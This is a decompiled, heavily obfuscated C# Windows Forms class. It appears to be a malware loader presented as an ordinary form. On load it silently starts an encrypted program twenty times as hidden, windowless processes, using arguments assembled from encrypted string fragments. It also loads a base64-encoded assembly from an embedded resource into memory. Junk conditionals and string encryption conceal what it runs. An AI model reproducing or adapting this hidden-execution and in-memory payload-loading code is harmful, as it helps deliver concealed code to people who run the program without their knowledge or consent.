using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using Acybfulhacvmrh;

namespace Gkdlku;

public sealed class h : Form
{
	private IContainer m_a;

	public h()
	{
		if (uint.MaxValue != 0)
		{
			c();
		}
	}

	private void a(object a, EventArgs b)
	{
		List<string> obj = new List<string>
		{
			k.a(-1973262713),
			k.a(-1973262702),
			k.a(-1973262689)
		};
		List<string> list;
		if (4u != 0)
		{
			list = obj;
		}
		int n;
		if (true)
		{
			n = 0;
		}
		for (; n < 20; n++)
		{
			string text = k.a(-1973262679) + list[new Random().Next(list.Count - 1)] + k.a(-1973262654);
			if (4u != 0)
			{
				this.a(text);
			}
		}
		this.a();
		this.b();
	}

	private void a()
	{
		AppDomain currentDomain = AppDomain.CurrentDomain;
		_ = 6;
		if (2 == 0)
		{
		}
		currentDomain.AssemblyResolve += a;
	}

	private void b()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		_ = 5;
		if (false)
		{
		}
		_ = 6;
		if (8 == 0)
		{
		}
		((Control)this).set_Text(((Control)this).get_Text() + new ClassLibrary().Data());
	}

	private Assembly a(object a, ResolveEventArgs b)
	{
		string text = k.a(-1973262641);
		string name = default(string);
		if (0 == 0)
		{
			name = text;
		}
		Stream? manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
		Stream stream;
		if (4u != 0)
		{
			stream = manifestResourceStream;
		}
		try
		{
			byte[] array = new byte[stream.Length];
			byte[] array2;
			if (true)
			{
				array2 = array;
			}
			stream.Read(array2, 0, array2.Length);
			byte[] rawAssembly = Convert.FromBase64String(Encoding.UTF8.GetString(array2).Replace(k.a(-1973262609), string.Empty));
			return AppDomain.CurrentDomain.Load(rawAssembly);
		}
		finally
		{
			((IDisposable)stream)?.Dispose();
		}
	}

	private void a(string a)
	{
		string text = k.a(-1973262600).Replace(k.a(-1973262835), string.Empty);
		string fileName;
		if (uint.MaxValue != 0)
		{
			fileName = text;
		}
		Process.Start(new ProcessStartInfo
		{
			FileName = fileName,
			Arguments = a,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		})!.WaitForExit();
	}

	protected override void Dispose(bool a)
	{
		if (a && this.m_a != null)
		{
			this.m_a.Dispose();
		}
		if (3u != 0)
		{
			((Form)this).Dispose(a);
		}
	}

	private void c()
	{
		if (4u != 0)
		{
			((Control)this).SuspendLayout();
		}
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		if (6u != 0)
		{
			((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		}
		if (5u != 0)
		{
			((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		}
		((Form)this).set_ClientSize(new Size(379, 197));
		((Control)this).set_Name(k.a(-1973262827));
		((Control)this).set_Text(k.a(-1973262827));
		((Form)this).add_Load((EventHandler)a);
		((Control)this).ResumeLayout(false);
	}
}
